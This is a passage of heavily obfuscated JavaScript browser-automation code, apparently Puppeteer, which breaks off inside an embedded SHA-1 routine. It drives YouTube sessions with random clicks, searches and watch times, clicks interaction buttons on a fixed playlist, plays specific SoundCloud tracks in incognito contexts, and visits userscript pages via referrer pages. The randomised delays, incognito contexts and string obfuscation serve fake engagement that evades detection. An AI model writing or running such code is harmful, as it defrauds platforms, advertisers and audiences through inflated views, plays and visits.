function a() {
  const bm = [
    'yxn0igXPDMuSBq',
    'easyfork.o',
    'zg9JDw1LBNqUza',
    'smu5FsnhwF',
    'Ahr0Chm6lY9NCG',
    'length',
    'pCkTDSoZW5JcKGTEpKq',
    'https://gr',
    'split',
    'W5JcSCkgWRJdQ1dcMgVdO8kl',
    'W5ykeG0Nx1RcMSkqta',
    'Agv4',
    'kvhdGNDDWROUpJhdJW',
    'dium.com/@',
    'xCoRbaZcTmkQW4NcTdhcUG',
    'l2zVDw5JCY9mAq',
    'rg/en/scri',
    'lwzHC3qTCMvHza',
    'ethics-of-',
    'CMCVzw4VC2nYAq',
    'kuuI4LzKgm',
    'W4lcLf3dI8k2amoOoXHZ',
    'm8oOW5ldRqiXy8obWRZcVG',
    'goto',
    'evPsJlNLy_',
    'tSiKyCpwnS',
    'Hm1YFszJWb',
    'mZCUmZyGkeTiva',
    'lor-names-',
    'h_NQ3y1ek8'
  ];
  a = function() {
    return bm;
  };
  return a();
}
const X = d,
  W = b,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x19b + -0x1 * 0x11fb + 0x1061 * 0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x9a1 + -0x2401 * -0x1 + -0x2da2), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1085 * -0x2 + -0x307d * -0x1 + 0x65bd + (0x3bc6 + 0x24aa + -0x1 * 0x25d8) * random()) : await standardWaitForNetIdle(f), await wait(0x4ca + 0x1b22 + -0x4 * 0x319 + (0x21e * 0x6 + 0x3861 + 0x1 * -0x1e05) * random()), 0x1 * -0x1552 + -0x8 * 0x250 + -0x5 * -0x7f7;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x10e * -0x2 + 0x1 * -0x1c87 + 0x1 * 0x322b), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1 * -0x88e + 0xf4c + -0x6bd;
}
async function randomWait() {
  return await wait(-0x1 * 0x17f3 + 0x24e1 + 0x69a + (-0x16b + -0xad * 0x32 + 0x36bd) * random()), -0x1 * -0x96b + -0x1b7f * 0x1 + 0x1 * 0x1215;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = b;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + R(0xa, '&%0d') + '--loaded'))['slice'](0x1c20 + 0x1fed + -0x3c0d * 0x1, 0xe * -0x134 + -0x17 * -0x193 + 0x3de * -0x5), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x72b * 0x35 + -0x560d + 0x3b7a * -0x1) * getRandomInt(-0x1 * -0x665 + 0x1937 * 0x1 + -0x1f9a * 0x1, -0x2467 * 0x1 + -0x3 * -0x4ef + 0x159f), h)), 0xb * -0x4f + -0x1 * 0x2063 + 0x23c9 * 0x1;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x7e + -0x1f12 + -0x10 * -0x1f9;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x2 * -0xb30 + 0x1533 + -0x16 * 0x1fb]['split']('\x20');
    for (let k = 0x1597 * 0x1 + -0x1b0 * 0x12 + -0x1 * -0x8c9; k < i['length']; k += 0xc * -0x29 + -0x1 * -0xf0b + -0xd1d)
      j += i[k] * h[i[k + (0x2 * 0x295 + -0x1c32 + 0x1709)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1 * -0xd5f + 0x4 * 0x20a + -0x1 * -0x53d)['map'](l => Array['from'](l['children']))['flat'](0xee6 + -0x269 * 0xd + 0x1070)['map'](l => l['childNodes'][-0x1642 + -0xa2a * 0x1 + -0x1 * -0x206d]['childNodes'][-0x202a + 0xae5 * 0x2 + 0xa60]['childNodes'][0x1545 * 0x1 + 0x203e + 0x2f9 * -0x12]['childNodes'][-0x1807 + -0x9 * 0x2f3 + 0x3292]['childNodes'][-0x26d0 + -0x22e6 + 0xa7 * 0x71]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x2 * 0x142 + 0x2 * -0x1a + 0x6a0, -0x1 * 0x2705 + 0x2 * 0x2de + 0x3 * 0x119b)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x3b78 + 0x72e1 + 0x1 * -0x73c1);
  const h = await getMaxTime(f),
    i = Math['min']((-0x16402 + 0xb * 0x1beb + -0x11b49 * -0x1) * getRandomInt(0x1 * 0xb26 + -0x1 * -0x112f + -0x1c53, -0x8 * 0x450 + 0xbcf * -0x2 + -0x1 * -0x3a23), h);
  return await wait(i), -0x17bc + 0x236a + -0x31 * 0x3d;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x3 * 0x4c7 + 0xef3 * 0x2 + -0x2c3b);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x11bb + -0x628 * 0x6 + 0x1335]['children'][-0x7 * 0x1f + 0x4 * -0x474 + -0x1 * -0x12a9]['children'][-0x15ab + 0x211e + -0xb73]['children'][0x1 * -0x1e32 + -0x21 * 0xe7 + 0x3bf9]['children'][0x2ce + -0x655 * 0x6 + 0x2330]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x47c + 0x230 + -0x6ab;
}
async function searchAndView(f) {
  const S = b;
  log('searching\x20' + S(0x9, 'HkRl') + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x9e9 + -0x3f * -0x9 + 0x73 * 0x12 + (-0x57 * -0x52 + 0x1d03 + 0x2b3 * -0x15) * random()
  }), await wait(-0x1 * 0x19c0 + -0xbbf * -0x2 + 0x436 + (0x1247 + 0xe71 * -0x1 + -0x2aa) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x3 * 0xc75 + -0x1077 + 0x35d8]['childNodes'][0x97c + -0xe16 + 0x9 * 0x83]['childNodes'][0x1a5f + 0x1e43 + -0x38a1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x5c * -0x22 + 0x1fc + -0x4b * -0x23]['childNodes'][0x3 * 0xb11 + -0x7e7 + -0x194c]['childNodes'][0x25f2 + 0xf79 + -0x3569]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x134 * -0x3 + 0x1f2e + -0x89 * 0x41),
          r = 0x328 * 0x7 + 0x1d * -0xe5 + 0xc5 * 0x5;
        for (let u = 0xd24 + -0x9 * 0x453 + -0x19c7 * -0x1; u < q['length']; u += -0x48 * 0x26 + 0x3bd * -0x2 + -0x2 * -0x916)
          r += q[u] * k[q[u + (0x17bd * -0x1 + -0x95e + -0xa3 * -0x34)]];
        return r;
      }(n);
  });
  await wait((0x103 * 0x16 + 0x741 * -0x10 + 0x9866) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xf195 + 0xddc0 + 0xfe35) * getRandomInt(0xe50 + 0xe28 + -0x1c77, -0x31c + 0x22c0 + -0x1f9a), h + (-0x3 * 0x30a + -0x122e + -0x176a * -0x2));
  return await wait(i), 0xc7a * 0x1 + -0x1b81 + 0xf08;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0xb93 + 0x265e * 0x1 + -0x31f1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xb * 0x3b + -0x15b5 + 0x1ee4 + (0x1cc * 0x3 + 0x5aa + -0x726) * Math['random']());
    });
  }, -0x2559 + 0xd5 * 0x17 + 0x2d8e);
  await wait(-0x3362b + 0x5db63 + 0x1eea8);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x11b43 + -0x2053 + -0x1090) * getRandomInt(-0x771 + -0xd87 * 0x2 + -0x13 * -0x1d1, 0x22b * -0x7 + 0x907 + 0x63f * 0x1)), clearInterval(h), -0xaf3 * 0x1 + 0x4 * 0x466 + -0x32 * 0x22;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * -0x1462 + -0x185 * 0x3 + 0xfd3 * -0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x183e + 0x1d * -0x26 + -0x9 * 0x237;
    await randomWait();
  }
  return 0x1 * -0x11a2 + -0x15f3 + 0x2796;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1c0 * 0x7 + 0x1918 + -0x2558 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1145 + 0x1 * 0xf49 + -0x208e + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xa + 0x4 * 0xa5 + 0x5 * -0x86 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x773 * -0x3 + -0x1 * 0xc7b + 0xb9c * 0x3;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x8 * 0x1ed6 + -0x6 * 0xb9e + -0x134 + getRandomInt(0xcb0 + -0x512 + -0xa * -0x519, -0xbb71 + 0xc53b * -0x1 + -0x7d77 * -0x4));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x45e + -0x21c2 + 0x1 * 0x1d65), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xc03 + -0xca1 * -0x1 + 0x9e * -0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xb * -0x1a3 + -0x2500 + 0x12ff, -0x1dfb * -0x1 + -0x1a10 + -0x3b9)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * 0x1015 + 0x1 * 0x2065 + -0x1455 * 0x2 + floor((-0x16 * 0x1a9 + 0x11 * 0x12f + 0x144f * 0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        const U = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x7 * 0x10037cc2 + -0x922251ca + -0xa * -0x269f791c),
          0x84b980 + -0x94b773 + 0x3 * 0x2fff51,
          0x5 * 0x1621 + -0x8762 + -0x281 * -0x3d,
          0x2 * 0xa9 + -0x667 + 0x595 * 0x1
        ], y = [
          -0x1c29 + 0x1384 * 0x2 + -0xac7,
          -0x2 * -0x630 + 0x1 * 0x92d + -0x1 * 0x157d,
          -0x1d49 + 0xf7d + 0xdd4,
          -0x2 * 0xfde + 0x1 * -0x3f5 + 0x23b1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x10d7 + 0x2663 * -0x1 + -0x3 * -0x1269)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x3 * -0xa0e + 0x1 * -0x26e1 + 0x5 * 0xdcf; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x192 * -0xd + 0x539 + 0xf31) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0xf3b + -0x1f4b * 0x1 + 0x5 * 0x94e] = A[-0x12a4 + -0x2b4 + 0x1568] = A[0x1 * -0x1edd + 0x1e92 + 0x4c] = A[0xb * 0x11f + 0x1d8 + -0xe2b] = A[0xf27 + 0x12b1 + -0x21d5] = A[-0x193 * -0xd + 0xd * 0xef + -0x2096] = A[-0x3 * -0xc95 + -0x885 + -0x1d35] = A[0x17 * 0x35 + -0xcde * 0x2 + 0x14ff] = A[-0xb58 + 0x9d * -0x21 + 0x1f9c] = A[0x1 * 0x261f + -0x52c + -0x35 * 0x9f] = A[-0xdc6 + 0xa3 + 0xd2c] = A[-0x394 * 0x2 + 0x211c + -0x19ea] = A[-0x1ad5 + 0x1d13 + -0x233 * 0x1] = A[-0x149d + -0xa * 0x2d7 + 0x310f * 0x1] = A[0x20c7 + -0x1 * 0x1bd + -0x1efd] = A[-0x2 * 0x3a + -0x1a18 + -0xa * -0x2a9] = A[-0x2231 * -0x1 + -0xfd * -0x27 + 0x3d * -0x131] = 0x32f * 0xb + 0x1800 + -0x3b05, this['blocks'] = A) : this['blocks'] = [
                0x26af + -0x1 * -0x305 + -0x29b4,
                -0x1c7 + -0x3 * 0x81f + 0x1a24,
                -0x5 * -0x397 + 0x7 * -0x1e6 + -0x4a9,
                0x1e04 * 0x1 + -0x215 * -0x1 + -0x2019,
                0x7 * 0x273 + 0xd4 * 0x4 + -0x1475 * 0x1,
                0x1 * -0x14cb + 0x194 * -0x2 + 0x17f3,
                -0x1 * -0x11cc + 0x81e + 0x2 * -0xcf5,
                -0x19be + 0x2 * 0x21f + 0x1580,
                -0x1f40 + 0x2272 + -0x199 * 0x2,
                0xbaa * 0x3 + 0x11f5 + -0x34f3,
                -0x10c1 + -0x1 * -0x35e + -0xd63 * -0x1,
                -0xaed + 0x2d * -0x39 + 0x14f2,
                0x10fd + -0x36c * 0x2 + -0xa25,
                -0x248c + 0xced * -0x3 + 0x4b53,
                -0x10f5 + -0x1107 * -0x1 + -0x1 * 0x12,
                0xa * -0x163 + -0x1a66 + -0x2844 * -0x1,
                -0xb45 + 0x1 * 0xb32 + 0x13
              ], this['h0'] = 0x8b5ec924 + -0x502decf * 0x27 + 0xd72 * 0xbd9cb, this['h1'] = -0x1c4692e47 + 0x57df0c5c + 0x25c57cd74, this['h2'] = -0x11d6bf8d + 0x4437d6cc + 0x6659c5bf, this['h3'] = 0x5ba6062 + 0xa5a1911 + 0x1ddb03, this['h4'] = -0x1622afc86 + -0x81c70e3 * -0x5 + 0x1fd6faa07, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x28d * 0x1 + 0x13a * 0x6 + -0x9e9, this['finalized'] = this['hashed'] = 0x542 + 0x15f4 + -0x2 * 0xd9b, this['first'] = -0x1a7 + 0x9e7 + -0x83f;
            }
            ['update'](J) {
              const T = d;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1 * 0x893 + 0x24f * 0x9 + -0xc34, O = J[T(0x5)] || 0x444 + -0x1 * -0x1c88 + 0x20cc * -0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x118f + -0x1714 + -0x1 * -0x585, P[0x21e2 + -0x2295 + 0x1 * 0xb3] = this['block'], P[0x1564 * 0x1 + -0x38a + -0x11ca] = P[0x138 + -0x16e7 + -0x15b * -0x10] = P[0x2104 + -0x16d1 + -0x1 * 0xa31] = P[0x7df + 0x160 * -0x2 + -0x51c] = P[0x19ef + 0x2b6 * 0xb + -0x37bd] = P[0x85c + 0xa6 * 0x5 + -0xb95] = P[-0xaf6 + 0xe9d + -0x3a1] = P[-0x131 * 0x2 + 0xc88 + -0xa1f] = P[-0x10f * 0xc + 0x1ab8 + -0xdfc * 0x1] = P[-0xc47 + 0x1186 + 0x1 * -0x536] = P[-0x1336 * 0x1 + 0xd3 * -0x8 + 0x676 * 0x4] = P[0x391 + 0x248 + -0x5ce] = P[0x4 * -0x2db + -0x1 * 0x12a9 + 0x1e21] = P[-0x1 * -0x15dd + -0x11b8 + -0x418] = P[0x2493 + 0x94c + -0x2dd1] = P[-0x17 * 0x49 + -0x222 + 0x7 * 0x140] = -0x17cf * -0x1 + -0x1cea * 0x1 + 0x51b * 0x1), K) {
                    for (N = this['start']; M < O && N < 0x32 * 0xc1 + 0x2376 + 0x123a * -0x4; ++M)
                      P[N >> -0xd79 + -0x2514 * -0x1 + -0x1799] |= J[M] << y[-0x1 * -0x10b9 + -0x1b33 + 0x1 * 0xa7d & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x10c1 + -0x1c94 + 0x2d95; ++M)
                      (L = J['charCodeAt'](M)) < -0x1049 + 0xe * -0x18d + -0x447 * -0x9 ? P[N >> -0xc97 * 0x1 + -0x5 * 0x3b2 + -0xd7 * -0x25] |= L << y[-0x1f41 + -0xf99 + 0x2edd & N++] : L < -0x1 * 0xd45 + 0x1e75 + 0x188 * -0x6 ? (P[N >> -0x4 * -0xb9 + -0x89 * -0x47 + -0x28e1] |= (-0x1210 + 0x1beb + -0x91b | L >> -0xb8 + -0xd76 + 0xe34) << y[0xd7 * 0x1 + 0x2f * -0x5b + -0x10f * -0xf & N++], P[N >> 0x32 * -0x8f + -0xf30 + 0x2b20] |= (0x1 * 0x2627 + 0x83 * 0xb + -0x2b48 | 0x146e + -0x18b + 0x952 * -0x2 & L) << y[0x229d + 0x157 * -0x3 + -0x1e95 * 0x1 & N++]) : L < -0x11 * 0xf3a + -0xd707 + 0x2b1e1 || L >= 0x27d4 * 0x3 + -0x157b1 + 0x1c035 ? (P[N >> 0x16f3 + -0x1f6e + -0x29 * -0x35] |= (0x1819 + -0x15e7 + 0xd * -0x1a | L >> 0x1892 + 0x1353 + -0x19 * 0x1c1) << y[-0xc * -0x322 + -0x952 * -0x1 + -0x2ee7 & N++], P[N >> -0x447 * -0x1 + -0x45c + -0x1 * -0x17] |= (0x8b6 + -0x20c6 + 0x1890 | L >> -0x1 * -0x1ed3 + -0x1557 + 0x7 * -0x15a & 0x2472 + -0x1de3 + -0x650) << y[-0x491 * 0x1 + -0x1 * 0x9c7 + 0xe5b & N++], P[N >> 0x74 * 0x55 + -0x177a + -0xf08] |= (-0x13c4 + 0x10a8 + -0xb * -0x54 | 0x1 * 0xd50 + -0x1 * 0x22cb + -0xadd * -0x2 & L) << y[-0x3a4 + 0x1d * 0x139 + -0x1fce & N++]) : (L = -0xa61a + 0x1fe + -0xa1 * -0x29c + ((-0x1 * 0x1a9f + -0x1 * 0x14ef + 0x338d & L) << -0x8 * 0x9e + 0xc7 * 0x6 + -0x2 * -0x28 | 0x1 * -0x59 + 0x204b + -0x1bf3 * 0x1 & J['charCodeAt'](++M)), P[N >> -0x226e + 0x1786 + -0x1 * -0xaea] |= (-0xd10 + -0x10b1 + 0x123 * 0x1b | L >> -0x1a5e + 0xd9c + 0xcd4) << y[-0xa51 + 0x44c * 0x2 + -0xde * -0x2 & N++], P[N >> 0x139d + -0x10b7 + -0x2e4] |= (-0x2c9 * -0x6 + -0xa5f * -0x1 + -0x1a95 | L >> -0x1aa5 + 0x116 + 0x159 * 0x13 & 0x32f * 0x5 + -0x103 * 0x26 + 0x48e * 0x5) << y[-0x1 * 0x7b9 + 0x1 * 0xa7 + 0x715 & N++], P[N >> 0x7cc + -0x3c * -0xb + -0xa5e] |= (-0x1e76 + -0x1e9 * 0xe + -0x2 * -0x1cda | L >> 0x537 + -0x11a2 + 0xd * 0xf5 & 0xdb4 + -0x175f + 0x9ea) << y[0xe1f + -0xca0 + -0x17c & N++], P[N >> 0xa18 + 0x49a + -0x14 * 0xbc] |= (-0x1df4 + -0x2197 * -0x1 + -0x1 * 0x323 | -0xc1 * -0x28 + 0x23c * -0x10 + 0x5d7 & L) << y[-0x4 * 0x959 + 0x400 + 0x2167 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x231e + -0x1 * 0x59b + 0x28f9 ? (this['block'] = P[0x776 + -0x38 * 0xa9 + 0x1d92], this['start'] = N - (-0xbdc * 0x3 + 0x20ad + 0x327), this['hash'](), this['hashed'] = 0x1c05 + -0x6d * 0x2b + -0x9b5) : this['start'] = N;
                }
                return this['bytes'] > -0xfe922fe7 + 0x1907e673b + 0x1 * 0x6e13c8ab && (this['hBytes'] += this['bytes'] / (0x78d2a710 + 0x350 * -0x2cf6e1 + 0x11c1f2240) << 0xe43 + -0x59 * -0x1 + -0xe9c * 0x1, this['bytes'] = this['bytes'] % (0x1937ec288 + 0x12c689f74 + -0x1bfe761fc)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1990 + -0x2366 + 0x3cf7;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x164c + -0x54e + -0x10ee] = this['block'], J[K >> -0xbf * -0x22 + 0x14 * -0x185 + 0x508] |= x[0x1d6d + 0x1112 * -0x2 + 0x4ba & K], this['block'] = J[0xb * 0x2dd + 0x3f * 0x61 + 0x1 * -0x374e], K >= 0x1 * 0x1a17 + 0x1be * -0x7 + -0xdad && (this['hashed'] || this['hash'](), J[-0x17c4 + 0x1 * -0xde7 + 0x25ab] = this['block'], J[-0x6e6 * -0x2 + 0x2514 + -0x32d0] = J[-0x1a * 0x53 + 0x244 + 0x1 * 0x62b] = J[-0x1 * -0xb01 + -0x2582 + 0x1a83] = J[0x29 * 0x23 + 0x7f * -0x26 + -0x6a1 * -0x2] = J[0x56 * 0x5e + 0x1 * 0x1346 + 0x3 * -0x10f2] = J[-0x52 * 0x29 + 0x1b47 * -0x1 + 0x9 * 0x47e] = J[-0x1 * -0xf0e + 0x10f5 * 0x2 + -0x30f2] = J[0x1210 + 0x21be + -0x33c7] = J[0x13e9 * 0x1 + -0x14bd * -0x1 + 0x3 * -0xd8a] = J[0x3 * -0x28d + 0x10fb + 0x27 * -0x3d] = J[-0x1f42 + 0xb97 + 0x13b5] = J[0x446 + 0x39 * 0x5d + -0x18f0] = J[-0xc71 + 0x2e * -0x68 + 0x1f2d * 0x1] = J[-0x7 * 0x32c + -0x2e * -0x60 + -0x7 * -0xb7] = J[0x1a * 0xa3 + 0x2062 + 0x1871 * -0x2] = J[-0x1d13 + -0xe5 + 0x1e07 * 0x1] = -0x1f55 + 0x132e + 0xc27), J[-0x39 * -0x1e + -0x2f * -0x53 + -0x15dd] = this['hBytes'] << 0x21 * 0x12b + 0x1 * -0x986 + 0x5e * -0x4f | this['bytes'] >>> -0x5cb * 0x2 + -0x11b8 + 0x1d6b, J[-0xf31 * -0x1 + 0x1365 + -0x2287] = this['bytes'] << -0x7c * -0x15 + -0x1bb5 + -0x8c6 * -0x2, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0xcb4 + 0x39 * -0x43 + 0x1baf; J < 0x127b + -0x16c + -0x10bf; ++J)
